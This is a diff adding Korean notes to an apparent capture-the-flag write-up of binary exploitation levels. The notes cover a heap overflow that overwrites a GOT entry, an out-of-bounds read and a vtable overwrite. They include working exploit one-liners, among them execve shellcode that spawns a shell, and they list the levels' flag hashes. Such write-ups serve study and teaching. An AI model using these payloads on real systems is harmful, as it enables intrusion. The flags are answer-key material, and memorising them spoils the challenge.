@@ -55,3 +55,50 @@ strcpy의 buffer overflow를 이용해서 잘못된 함수 포인터를 넣을 �
 
 > level7 - f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
+malloc을 총 4번 실행하는데, 대충
+
+```c
+struct test {
+    int dummy;
+    char *p;
+}
+
+a = malloc(sizeof(struct test));
+b = malloc(STRING_SIZE);
+a->p = b;
+
+c = malloc(sizeof(struct test));
+d = malloc(STRING_SIZE);
+c->p = d;
+```
+과 같은 순서로 할당한다.
+이때 매모리 상에서의 순서가 a -> b -> c -> d가 되므로,
+
+첫번째 strcpy(dst는 b위치에 있음)에서 c->p위치를 덮어쓸 수 있다.
+
+이 위치를 puts의 GOT로 덮어 쓴 다음에
+
+두 번째 strcpy에서 함수 m의 위치를 복사하면 된다.
+
+```bash
+/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08",') $(python -c 'print "\xf4\x84\x04\x08",')
+```
+
+> level8 - 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+배열크기를 초과한 위치를 참조하는 것을 이용했다.
+
+```bash
+cat <(printf "auth .\nservice0123456789012345\nlogin\n") - | ./level8
+```
+
+> level9 - c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+memcopy를 인자에서 받아서 실행하는데, vtable을 덮어써서 쉘코드를 실행시킬 수 있다.
+
+```bash
+./level9 $(python -c 'print "\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 76) + "\x0c\xa0\x04\x08",')
+```
+
+> bonus0 - f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
